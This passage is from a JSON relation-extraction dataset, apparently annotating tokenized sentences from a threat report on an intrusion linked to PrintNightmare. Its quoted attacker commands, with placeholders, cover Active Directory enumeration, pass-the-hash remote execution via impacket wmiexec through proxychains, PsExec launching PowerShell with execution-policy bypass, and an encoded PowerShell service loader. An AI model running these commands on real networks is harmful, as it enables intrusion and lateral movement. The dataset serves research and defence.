{"r": "RD", "evidence": [3], "h": 19, "t": 20}, {"r": "RD", "evidence": [3], "h": 19, "t": 21}, {"r": "ST", "evidence": [3], "h": 19, "t": 22}, {"r": "RD", "evidence": [3], "t": 21, "h": 23}, {"r": "FR", "evidence": [4], "h": 24, "t": 25}, {"r": "FR", "evidence": [4], "h": 24, "t": 26}, {"r": "FR", "evidence": [5], "h": 27, "t": 28}, {"r": "RD", "evidence": [5], "h": 27, "t": 29}, {"r": "WR", "evidence": [5], "h": 27, "t": 30}, {"r": "RD", "evidence": [5], "h": 31, "t": 32}, {"r": "WR", "evidence": [5], "h": 31, "t": 33}, {"r": "CO", "evidence": [5], "h": 28, "t": 31}, {"r": "FR", "evidence": [6], "h": 34, "t": 35}, {"r": "WR", "evidence": [6], "h": 34, "t": 36}, {"r": "RD", "evidence": [6, 7], "h": 34, "t": 37}, {"r": "IJ", "evidence": [6, 7], "h": 34, "t": 38}, {"r": "IJ", "evidence": [6, 7], "h": 34, "t": 39}, {"r": "RD", "evidence": [6, 7], "h": 34, "t": 40}]}, {"title": "075-0", "sents": [["If", "users", "have", "not", "already", ",", "they", "should", "download", "the", "latest", "patch", "for", "PrintNightmare", "from", "Microsoft", "."], ["The", "``", "sudo", "''", "command", "was", "used", "to", "obtain", "credentials", "associated", "with", "a", "commercial", "backup", "solution", ",", "likely", "trying", "to", "gain", "access", "to", "backups", "present", "within", "the", "environment.sudo", "-s", "-k", "-p", "[", "Backup", "Prompt", "]", "whoamiWe", "also", "observed", "the", "use", "of", "impacket", ",", "a", "common", "network", "protocol", "manipulation", "tool", "to", "enumerate", "the", "environment", "and", "obtain", "additional", "information", "about", "the", "Active", "Directory", "configuration", "in", "place", "."], ["Below", "are", "some", "examples", "of", "the", "command", "line", "syntax", "used", "for", "the", "performance", "of", "this", "activity.cmd.exe", "/q", "/c", "net", "group", "enterprise", "admins", "/domain", "1", ">", "\\\\127", "."], ["The", "adversaries", "used", "the", "``", "nltest", "''", "command", "for", "this", "purpose.c", ":", "\\windows\\system32ltest.exe", "/dclist", ":", "linux", "[", "HOSTNAME", "]", "Execution", "ATT", "&", "CK", "Technique", ":", "Command", "and", "Scripting", "Interpreter", ":", "Windows", "Command", "Shell", "(", "T1059", "."], ["002", ")", "Similar", "to", "what", "was", "observed", "during", "the", "post-compromise", "reconnaissance", "phase", "of", "the", "attack", ",", "the", "adversary", "used", "impacket", "to", "execute", "Windows", "Management", "Instrumentation", "(", "WMI", ")", "to", "achieve", "command", "execution", "on", "other", "systems", "present", "in", "the", "environment", "."], ["The", "attacker", "also", "used", "the", "``", "proxychains", "''", "utility", ",", "which", "is", "often", "employed", "to", "redirect", "network", "traffic", "during", "penetration", "testing", ",", "red", "teaming", ",", "and", "other", "offensive", "operations.cmd.exe", "/q", "/c", "proxychains", "~/impacket/examples/wmiexec.py", "-hashes", "[", "SHA256", "HASH", "]", "[", "USERNAME", "]", "@", "[", "IP", "ADDRESS", "]", "1", ">", "\\\\127", "."], ["1\\admin", "$", "\\__", "[", "STRING", "]", "2", ">", "&", "1We", "also", "observed", "the", "adversary", "using", "Windows", "Batch", "files", "to", "execute", "PSExec", "."], ["In", "this", "case", ",", "PSExec", "remotely", "authenticated", "and", "executed", "PowerShell", "on", "remote", "systems", "within", "the", "environment.cmd.exe", "/c", "C", ":", "\\s", "$", "\\0.bat", "PsExec.exe", "-d", "\\\\", "[", "HOSTNAME", "]", "-u", "[", "DOMAIN", "]", "\\", "[", "USERNAME", "]", "-p", "[", "PASSWORD", "]", "-accepteula", "-s", "cmd", "/c", "powershell.exe", "-ExecutionPolicy", "Bypass", "-file", "\\\\", "[", "HOSTNAME", "]", "\\s", "$", "\\p.ps1", "There", "were", "also", "artifacts", "in", "the", "environment", "that", "indicate", "that", "the", "recently", "disclosed", "PrintNightmare", "vulnerability", "may", "have", "been", "used", "during", "this", "attack", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "users", "pos": [1, 2], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [13, 13], "name": "PrintNightmare", "pos": [13, 14], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [19, 19], "name": "sudo", "pos": [2, 3], "index": "2_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [26, 26], "name": "credentials", "pos": [9, 10], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [31, 31], "name": "backup solution", "pos": [14, 16], "index": "4_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [58, 58], "name": "impacket", "pos": [41, 42], "index": "5_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [69, 69], "name": "environment", "pos": [52, 53], "index": "6_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [73, 73], "name": "information", "pos": [56, 57], "index": "7_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [88, 88], "name": "command line syntax", "pos": [6, 9], "index": "8_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [97, 97], "name": "activity.cmd.exe", "pos": [15, 16], "index": "9_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [110, 110], "name": "adversaries", "pos": [1, 2], "index": "10_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [114, 114], "name": "nltest", "pos": [5, 6], "index": "11_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [119, 119], "name": "purpose.c", "pos": [10, 11], "index": "12_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [162, 162], "name": "adversary", "pos": [17, 18], "index": "13_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [164, 164], "name": "impacket", "pos": [19, 20], "index": "14_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [167, 167], "name": "Windows Management Instrumentation", "pos": [22, 25], "index": "15_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [186, 186], "name": "attacker", "pos": [1, 2], "index": "16_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [191, 191], "name": "proxychains", "pos": [6, 7], "index": "17_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [248, 248], "name": "adversary", "pos": [13, 14], "index": "18_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [250, 250], "name": "Windows Batch files", "pos": [15, 18], "index": "19_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [255, 255], "name": "PSExec", "pos": [20, 21], "index": "20_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [261, 261], "name": "PSExec", "pos": [4, 5], "index": "21_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [266, 266], "name": "PowerShell", "pos": [9, 10], "index": "22_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [325, 325], "name": "PrintNightmare vulnerability", "pos": [68, 70], "index": "23_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "FR", "evidence": [1], "h": 2, "t": 4}, {"r": "RD", "evidence": [1], "t": 3, "h": 4}, {"r": "FR", "evidence": [1], "h": 4, "t": 5}, {"r": "RD", "evidence": [1], "h": 5, "t": 6}, {"r": "RD", "evidence": [1], "h": 5, "t": 7}, {"r": "FR", "evidence": [2], "h": 8, "t": 9}, {"r": "FR", "evidence": [3], "h": 10, "t": 11}, {"r": "FR", "evidence": [3], "h": 11, "t": 12}, {"r": "CO", "evidence": [3, 4], "h": 10, "t": 13}, {"r": "FR", "evidence": [4], "h": 13, "t": 14}, {"r": "EX", "evidence": [4], "h": 14, "t": 15}, {"r": "FR", "evidence": [5], "h": 16, "t": 17}, {"r": "FR", "evidence": [6], "h": 18, "t": 19}, {"r": "EX", "evidence": [6], "h": 19, "t": 20}, {"r": "EX", "evidence": [7], "h": 21, "t": 22}, {"r": "FR", "evidence": [7], "h": 21, "t": 23}]}, {"title": "075-1", "sents": [["The", "``", "sudo", "''", "command", "was", "used", "to", "obtain", "credentials", "associated", "with", "a", "commercial", "backup", "solution", ",", "likely", "trying", "to", "gain", "access", "to", "backups", "present", "within", "the", "environment.sudo", "-s", "-k", "-p", "[", "Backup", "Prompt", "]", "whoamiWe", "also", "observed", "the", "use", "of", "impacket", ",", "a", "common", "network", "protocol", "manipulation", "tool", "to", "enumerate", "the", "environment", "and", "obtain", "additional", "information", "about", "the", "Active", "Directory", "configuration", "in", "place", "."], ["Below", "are", "some", "examples", "of", "the", "command", "line", "syntax", "used", "for", "the", "performance", "of", "this", "activity.cmd.exe", "/q", "/c", "net", "group", "enterprise", "admins", "/domain", "1", ">", "\\\\127", "."], ["The", "adversaries", "used", "the", "``", "nltest", "''", "command", "for", "this", "purpose.c", ":", "\\windows\\system32ltest.exe", "/dclist", ":", "linux", "[", "HOSTNAME", "]", "Execution", "ATT", "&", "CK", "Technique", ":", "Command", "and", "Scripting", "Interpreter", ":", "Windows", "Command", "Shell", "(", "T1059", "."], ["002", ")", "Similar", "to", "what", "was", "observed", "during", "the", "post-compromise", "reconnaissance", "phase", "of", "the", "attack", ",", "the", "adversary", "used", "impacket", "to", "execute", "Windows", "Management", "Instrumentation", "(", "WMI", ")", "to", "achieve", "command", "execution", "on", "other", "systems", "present", "in", "the", "environment", "."], ["The", "attacker", "also", "used", "the", "``", "proxychains", "''", "utility", ",", "which", "is", "often", "employed", "to", "redirect", "network", "traffic", "during", "penetration", "testing", ",", "red", "teaming", ",", "and", "other", "offensive", "operations.cmd.exe", "/q", "/c", "proxychains", "~/impacket/examples/wmiexec.py", "-hashes", "[", "SHA256", "HASH", "]", "[", "USERNAME", "]", "@", "[", "IP", "ADDRESS", "]", "1", ">", "\\\\127", "."], ["1\\admin", "$", "\\__", "[", "STRING", "]", "2", ">", "&", "1We", "also", "observed", "the", "adversary", "using", "Windows", "Batch", "files", "to", "execute", "PSExec", "."], ["In", "this", "case", ",", "PSExec", "remotely", "authenticated", "and", "executed", "PowerShell", "on", "remote", "systems", "within", "the", "environment.cmd.exe", "/c", "C", ":", "\\s", "$", "\\0.bat", "PsExec.exe", "-d", "\\\\", "[", "HOSTNAME", "]", "-u", "[", "DOMAIN", "]", "\\", "[", "USERNAME", "]", "-p", "[", "PASSWORD", "]", "-accepteula", "-s", "cmd", "/c", "powershell.exe", "-ExecutionPolicy", "Bypass", "-file", "\\\\", "[", "HOSTNAME", "]", "\\s", "$", "\\p.ps1", "There", "were", "also", "artifacts", "in", "the", "environment", "that", "indicate", "that", "the", "recently", "disclosed", "PrintNightmare", "vulnerability", "may", "have", "been", "used", "during", "this", "attack", "."], ["The", "Windows", "service", "was", "configured", "with", "the", "following", "options", ":", "Service", "Type", ":", "user", "mode", "service", "Service", "Start", "Type", ":", "demand", "start", "Service", "Account", ":", "LocalSystem", "Service", "Name", ":", "Updater", "Service", "Filename", ":", "%", "COMSPEC", "%", "/C", "start", "/b", "%", "WINDIR", "%", "\\System32\\WindowsPowershell\\v1", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [2, 2], "name": "sudo", "pos": [2, 3], "index": "0_0"}], [{"type": "TF", "sent_id": 0, "global_pos": [9, 9], "name": "credentials", "pos": [9, 10], "index": "1_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [14, 14], "name": "backup solution", "pos": [14, 16], "index": "2_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [41, 41], "name": "impacket", "pos": [41, 42], "index": "3_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [52, 52], "name": "environment", "pos": [52, 53], "index": "4_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [56, 56], "name": "information", "pos": [56, 57], "index": "5_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [71, 71], "name": "command line syntax", "pos": [6, 9], "index": "6_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [80, 80], "name": "activity.cmd.exe", "pos": [15, 16], "index": "7_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [93, 93], "name": "adversaries", "pos": [1, 2], "index": "8_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [97, 97], "name": "nltest", "pos": [5, 6], "index": "9_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [102, 102], "name": "purpose.c", "pos": [10, 11], "index": "10_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [145, 145], "name": "adversary", "pos": [17, 18], "index": "11_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [147, 147], "name": "impacket", "pos": [19, 20], "index": "12_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [150, 150], "name": "Windows Management Instrumentation", "pos": [22, 25], "index": "13_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [169, 169], "name": "attacker", "pos": [1, 2], "index": "14_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [174, 174], "name": "proxychains", "pos": [6, 7], "index": "15_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [231, 231], "name": "adversary", "pos": [13, 14], "index": "16_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [233, 233], "name": "Windows Batch files", "pos": [15, 18], "index": "17_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [238, 238], "name": "PSExec", "pos": [20, 21], "index": "18_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [244, 244], "name": "PSExec", "pos": [4, 5], "index": "19_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [249, 249], "name": "PowerShell", "pos": [9, 10], "index": "20_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [308, 308], "name": "PrintNightmare vulnerability", "pos": [68, 70], "index": "21_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [319, 319], "name": "Windows service", "pos": [1, 3], "index": "22_0"}]], "labels": [{"r": "FR", "evidence": [0], "h": 0, "t": 2}, {"r": "RD", "evidence": [0], "t": 1, "h": 2}, {"r": "FR", "evidence": [0], "h": 2, "t": 3}, {"r": "RD", "evidence": [0], "h": 3, "t": 4}, {"r": "RD", "evidence": [0], "h": 3, "t": 5}, {"r": "FR", "evidence": [1], "h": 6, "t": 7}, {"r": "FR", "evidence": [2], "h": 8, "t": 9}, {"r": "FR", "evidence": [2], "h": 9, "t": 10}, {"r": "CO", "evidence": [2, 3], "h": 8, "t": 11}, {"r": "FR", "evidence": [3], "h": 11, "t": 12}, {"r": "EX", "evidence": [3], "h": 12, "t": 13}, {"r": "FR", "evidence": [4], "h": 14, "t": 15}, {"r": "FR", "evidence": [5], "h": 16, "t": 17}, {"r": "EX", "evidence": [5], "h": 17, "t": 18}, {"r": "EX", "evidence": [6], "h": 19, "t": 20}, {"r": "FR", "evidence": [6], "h": 19, "t": 21}, {"r": "RD", "evidence": [6, 7], "t": 20, "h": 22}]}, {"title": "075-2", "sents": [["Below", "are", "some", "examples", "of", "the", "command", "line", "syntax", "used", "for", "the", "performance", "of", "this", "activity.cmd.exe", "/q", "/c", "net", "group", "enterprise", "admins", "/domain", "1", ">", "\\\\127", "."], ["The", "adversaries", "used", "the", "``", "nltest", "''", "command", "for", "this", "purpose.c", ":", "\\windows\\system32ltest.exe", "/dclist", ":", "linux", "[", "HOSTNAME", "]", "Execution", "ATT", "&", "CK", "Technique", ":", "Command", "and", "Scripting", "Interpreter", ":", "Windows", "Command", "Shell", "(", "T1059", "."], ["002", ")", "Similar", "to", "what", "was", "observed", "during", "the", "post-compromise", "reconnaissance", "phase", "of", "the", "attack", ",", "the", "adversary", "used", "impacket", "to", "execute", "Windows", "Management", "Instrumentation", "(", "WMI", ")", "to", "achieve", "command", "execution", "on", "other", "systems", "present", "in", "the", "environment", "."], ["The", "attacker", "also", "used", "the", "``", "proxychains", "''", "utility", ",", "which", "is", "often", "employed", "to", "redirect", "network", "traffic", "during", "penetration", "testing", ",", "red", "teaming", ",", "and", "other", "offensive", "operations.cmd.exe", "/q", "/c", "proxychains", "~/impacket/examples/wmiexec.py", "-hashes", "[", "SHA256", "HASH", "]", "[", "USERNAME", "]", "@", "[", "IP", "ADDRESS", "]", "1", ">", "\\\\127", "."], ["1\\admin", "$", "\\__", "[", "STRING", "]", "2", ">", "&", "1We", "also", "observed", "the", "adversary", "using", "Windows", "Batch", "files", "to", "execute", "PSExec", "."], ["In", "this", "case", ",", "PSExec", "remotely", "authenticated", "and", "executed", "PowerShell", "on", "remote", "systems", "within", "the", "environment.cmd.exe", "/c", "C", ":", "\\s", "$", "\\0.bat", "PsExec.exe", "-d", "\\\\", "[", "HOSTNAME", "]", "-u", "[", "DOMAIN", "]", "\\", "[", "USERNAME", "]", "-p", "[", "PASSWORD", "]", "-accepteula", "-s", "cmd", "/c", "powershell.exe", "-ExecutionPolicy", "Bypass", "-file", "\\\\", "[", "HOSTNAME", "]", "\\s", "$", "\\p.ps1", "There", "were", "also", "artifacts", "in", "the", "environment", "that", "indicate", "that", "the", "recently", "disclosed", "PrintNightmare", "vulnerability", "may", "have", "been", "used", "during", "this", "attack", "."], ["The", "Windows", "service", "was", "configured", "with", "the", "following", "options", ":", "Service", "Type", ":", "user", "mode", "service", "Service", "Start", "Type", ":", "demand", "start", "Service", "Account", ":", "LocalSystem", "Service", "Name", ":", "Updater", "Service", "Filename", ":", "%", "COMSPEC", "%", "/C", "start", "/b", "%", "WINDIR", "%", "\\System32\\WindowsPowershell\\v1", "."], ["0\\powershell", "-noP", "-sta", "-w", "1", "-enc", "[", "BASE64", "ENCODED", "BLOB", "]", "As", "can", "be", "seen", "above", ",", "the", "PowerShell", "being", "executed", "was", "Base64", "encoded", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [6, 6], "name": "command line syntax", "pos": [6, 9], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [15, 15], "name": "activity.cmd.exe", "pos": [15, 16], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [28, 28], "name": "adversaries", "pos": [1, 2], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [32, 32], "name": "nltest", "pos": [5, 6], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [37, 37], "name": "purpose.c", "pos": [10, 11], "index": "4_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [80, 80], "name": "adversary", "pos": [17, 18], "index": "5_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [82, 82], "name": "impacket", "pos": [19, 20], "index": "6_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [85, 85], "name": "Windows Management Instrumentation", "pos": [22, 25], "index": "7_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [104, 104], "name": "attacker", "pos": [1, 2], "index": "8_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [109, 109], "name": "proxychains", "pos": [6, 7], "index": "9_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [166, 166], "name": "adversary", "pos": [13, 14], "index": "10_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [168, 168], "name": "Windows Batch files", "pos": [15, 18], "index": "11_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [173, 173], "name": "PSExec", "pos": [20, 21], "index": "12_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [179, 179], "name": "PSExec", "pos": [4, 5], "index": "13_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [184, 184], "name": "PowerShell", "pos": [9, 10], "index": "14_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [243, 243], "name": "PrintNightmare vulnerability", "pos": [68, 70], "index": "15_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [254, 254], "name": "Windows service", "pos": [1, 3], "index": "16_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [315, 315], "name": "PowerShell", "pos": [18, 19], "index": "17_0"}]], "labels": [{"r": "FR", "evidence": [0], "h": 0, "t": 1}, {"r": "FR", "evidence": [1], "h": 2, "t": 3}, {"r": "FR", "evidence": [1], "h": 3, "t": 4}, {"r": "CO", "evidence": [1, 2], "h": 2, "t": 5}, {"r": "FR", "evidence": [2], "h": 5, "t": 6}, {"r": "EX", "evidence": [2], "h": 6, "t": 7}, {"r": "FR", "evidence": [3], "h": 8, "t": 9}, {"r": "FR", "evidence": [4], "h": 10, "t": 11}, {"r": "EX", "evidence": [4], "h": 11, "t": 12}, {"r": "EX", "evidence": [5], "h": 13, "t": 14}, {"r": "FR", "evidence": [5], "h": 13, "t": 15}, {"r": "CO", "evidence": [5, 6, 7], "h": 14, "t": 17}, {"r": "RD", "evidence": [5, 6], "t": 14, "h": 16}]}, {"title": "075-3", "sents": [["The", "adversaries", "used", "the", "``", "nltest", "''", "command", "for", "this", "purpose.c", ":", "\\windows\\system32ltest.exe", "/dclist", ":", "linux", "[", "HOSTNAME", "]", "Execution", "ATT", "&", "CK", "Technique", ":", "Command", "and", "Scripting", "Interpreter", ":", "Windows", "Command", "Shell", "(", "T1059", "."], ["002", ")", "Similar", "to", "what", "was", "observed", "during", "the", "post-compromise", "reconnaissance", "phase", "of", "the", "attack", ",", "the", "adversary", "used", "impacket", "to", "execute", "Windows", "Management", "Instrumentation", "(", "WMI", ")", "to", "achieve", "command", "execution", "on", "other", "systems", "present", "in", "the", "environment", "."], ["The", "attacker", "also", "used", "the", "``", "proxychains", "''", "utility", ",", "which", "is", "often", "employed", "to", "redirect", "network", "traffic", "during", "penetration", "testing", ",", "red", "teaming", ",", "and", "other", "offensive", "operations.cmd.exe", "/q", "/c", "proxychains", "~/impacket/examples/wmiexec.py", "-hashes", "[", "SHA256", "HASH", "]", "[", "USERNAME", "]", "@", "[", "IP", "ADDRESS", "]", "1", ">", "\\\\127", "."], ["1\\admin", "$", "\\__", "[", "STRING", "]", "2", ">", "&", "1We", "also", "observed", "the", "adversary", "using", "Windows", "Batch", "files", "to", "execute", "PSExec", "."], ["In", "this", "case", ",", "PSExec", "remotely", "authenticated", "and", "executed", "PowerShell", "on", "remote", "systems", "within", "the", "environment.cmd.exe", "/c", "C", ":", "\\s", "$", "\\0.bat", "PsExec.exe", "-d", "\\\\", "[", "HOSTNAME", "]", "-u", "[", "DOMAIN", "]", "\\", "[", "USERNAME", "]", "-p", "[", "PASSWORD", "]", "-accepteula", "-s", "cmd", "/c", "powershell.exe", "-ExecutionPolicy", "Bypass", "-file", "\\\\", "[", "HOSTNAME", "]", "\\s", "$", "\\p.ps1", "There", "were", "also", "artifacts", "in", "the", "environment", "that", "indicate", "that", "the", "recently", "disclosed", "PrintNightmare", "vulnerability", "may", "have", "been", "used", "during", "this", "attack", "."], ["The", "Windows", "service", "was", "configured", "with", "the", "following", "options", ":", "Service", "Type", ":", "user", "mode", "service", "Service", "Start", "Type", ":", "demand", "start", "Service", "Account", ":", "LocalSystem", "Service", "Name", ":", "Updater", "Service", "Filename", ":", "%", "COMSPEC", "%", "/C", "start", "/b", "%", "WINDIR", "%", "\\System32\\WindowsPowershell\\v1", "."], ["0\\powershell", "-noP", "-sta", "-w", "1", "-enc", "[", "BASE64", "ENCODED", "BLOB", "]", "As", "can", "be", "seen", "above", ",", "the", "PowerShell", "being", "executed", "was", "Base64", "encoded", "."], ["The", "decoded", "PowerShell", "instructions", "are", "below", ":", "This", "PowerShell", "is", "responsible", "for", "the", "performing", "the", "following", "tasks", ":", "Disabling", "PowerShell", "logging", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "adversaries", "pos": [1, 2], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [5, 5], "name": "nltest", "pos": [5, 6], "index": "1_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [10, 10], "name": "purpose.c", "pos": [10, 11], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [53, 53], "name": "adversary", "pos": [17, 18], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [55, 55], "name": "impacket", "pos": [19, 20], "index": "4_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [58, 58], "name": "Windows Management Instrumentation", "pos": [22, 25], "index": "5_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [77, 77], "name": "attacker", "pos": [1, 2], "index": "6_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [82, 82], "name": "proxychains", "pos": [6, 7], "index": "7_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [139, 139], "name": "adversary", "pos": [13, 14], "index": "8_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [141, 141], "name": "Windows Batch files", "pos": [15, 18], "index": "9_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [146, 146], "name": "PSExec", "pos": [20, 21], "index": "10_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [152, 152], "name": "PSExec", "pos": [4, 5], "index": "11_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [157, 157], "name": "PowerShell", "pos": [9, 10], "index": "12_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [216, 216], "name": "PrintNightmare vulnerability", "pos": [68, 70], "index": "13_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [227, 227], "name": "Windows service", "pos": [1, 3], "index": "14_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [288, 288], "name": "PowerShell", "pos": [18, 19], "index": "15_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [297, 297], "name": "PowerShell instructions", "pos": [2, 4], "index": "16_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [303, 303], "name": "PowerShell", "pos": [8, 9], "index": "17_0"}]], "labels": [{"r": "FR", "evidence": [0], "h": 0, "t": 1}, {"r": "FR", "evidence": [0], "h": 1, "t": 2}, {"r": "CO", "evidence": [0, 1], "h": 0, "t": 3}, {"r": "FR", "evidence": [1], "h": 3, "t": 4}, {"r": "EX", "evidence": [1], "h": 4, "t": 5}, {"r": "FR", "evidence": [2], "h": 6, "t": 7}, {"r": "FR", "evidence": [3], "h": 8, "t": 9}, {"r": "EX", "evidence": [3], "h": 9, "t": 10}, {"r": "EX", "evidence": [4], "h": 11, "t": 12}, {"r": "FR", "evidence": [4], "h": 11, "t": 13}, {"r": "CO", "evidence": [4, 5, 6], "h": 12, "t": 15}, {"r": "RD", "evidence": [4, 5], "t": 12, "h": 14}, {"r": "EX", "evidence": [7], "t": 16, "h": 17}]}, {"title": "075-4", "sents": [["002", ")", "Similar", "to", "what", "was", "observed", "during", "the", "post-compromise", "reconnaissance", "phase", "of", "the", "attack", ",", "the", "adversary", "used", "impacket", "to", "execute", "Windows", "Management", "Instrumentation", "(", "WMI", ")", "to", "achieve", "command", "execution", "on", "other", "systems", "present", "in", "the", "environment", "."], ["The", "attacker", "also", "used", "the", "``", "proxychains", "''", "utility", ",", "which", "is", "often", "employed", "to", "redirect", "network", "traffic", "during", "penetration", "testing", ",", "red", "teaming", ",", "and", "other", "offensive", "operations.cmd.exe", "/q", "/c", "proxychains", "~/impacket/examples/wmiexec.py", "-hashes", "[", "SHA256", "HASH", "]", "[", "USERNAME", "]", "@", "[", "IP", "ADDRESS", "]", "1", ">", "\\\\127", "."], ["1\\admin", "$", "\\__", "[", "STRING", "]", "2", ">", "&", "1We", "also", "observed", "the", "adversary", "using", "Windows", "Batch", "files", "to", "execute", "PSExec", "."], ["In", "this", "case", ",", "PSExec", "remotely", "authenticated", "and", "executed", "PowerShell", "on", "remote", "systems", "within", "the", "environment.cmd.exe", "/c", "C", ":", "\\s", "$", "\\0.bat", "PsExec.exe", "-d", "\\\\", "[", "HOSTNAME", "]", "-u", "[", "DOMAIN", "]", "\\", "[", "USERNAME", "]", "-p", "[", "PASSWORD", "]", "-accepteula", "-s", "cmd", "/c", "powershell.exe", "-ExecutionPolicy", "Bypass", "-file", "\\\\", "[", "HOSTNAME", "]", "\\s", "$", "\\p.ps1", "There", "were", "also", "artifacts", "in", "the", "environment", "that", "indicate", "that", "the", "recently", "disclosed", "PrintNightmare", "vulnerability", "may", "have", "been", "used", "during", "this", "attack", "."], ["The", "Windows", "service", "was", "configured", "with", "the", "following", "options", ":", "Service", "Type", ":", "user", "mode", "service", "Service", "Start", "Type", ":", "demand", "start", "Service", "Account", ":", "LocalSystem", "Service", "Name", ":", "Updater", "Service", "Filename", ":", "%", "COMSPEC", "%", "/C", "start", "/b", "%", "WINDIR", "%", "\\System32\\WindowsPowershell\\v1", "."], ["0\\powershell", "-noP", "-sta", "-w", "1", "-enc", "[", "BASE64", "ENCODED", "BLOB", "]", "As", "can", "be", "seen", "above", ",", "the", "PowerShell", "being", "executed", "was", "Base64", "encoded", "."], ["The", "decoded", "PowerShell", "instructions", "are", "below", ":", "This", "PowerShell", "is", "responsible", "for", "the", "performing", "the", "following", "tasks", ":", "Disabling", "PowerShell", "logging", "."], ["Downloading", ",", "decrypting", ",", "and", "executing", "a", "backdoor", "payload", "from", "an", "attacker-controlled", "server", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [17, 17], "name": "adversary", "pos": [17, 18], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [19, 19], "name": "impacket", "pos": [19, 20], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [22, 22], "name": "Windows Management Instrumentation", "pos": [22, 25], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [41, 41], "name": "attacker", "pos": [1, 2], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [46, 46], "name": "proxychains", "pos": [6, 7], "index": "4_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [103, 103], "name": "adversary", "pos": [13, 14], "index": "5_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [105, 105], "name": "Windows Batch files", "pos": [15, 18], "index": "6_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [110, 110], "name": "PSExec", "pos": [20, 21], "index": "7_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [116, 116], "name": "PSExec", "pos": [4, 5], "index": "8_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [121, 121], "name": "PowerShell", "pos": [9, 10], "index": "9_0"}], [{"type": "MP", "sent_id": 3, 